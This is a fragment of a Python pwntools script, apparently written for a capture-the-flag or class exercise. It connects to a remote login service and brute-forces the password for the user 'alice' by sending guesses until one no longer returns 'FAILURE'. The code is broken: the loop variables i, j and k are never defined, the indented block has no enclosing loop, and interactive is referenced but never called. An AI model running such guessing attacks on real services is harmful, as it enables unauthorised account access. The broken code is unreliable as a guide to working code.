#!/usr/bin/env python
from pwn import *
import string
ip = "nsproj.bitisle.net"
port = 30010
s = remote(ip, port)
      buf = s.recvuntil('username:')
      #print buf
      payload = "alice"
      s.sendline(payload)

      buf = s.recvuntil('password:')
      #print buf
      payload = i+j+k
      s.sendline(payload)
      buf =  s.recvline()
      print payload
      print buf
      if "FAILURE" not in buf:
          print i+j+k
          print buf
          s.interactive
      # mmm
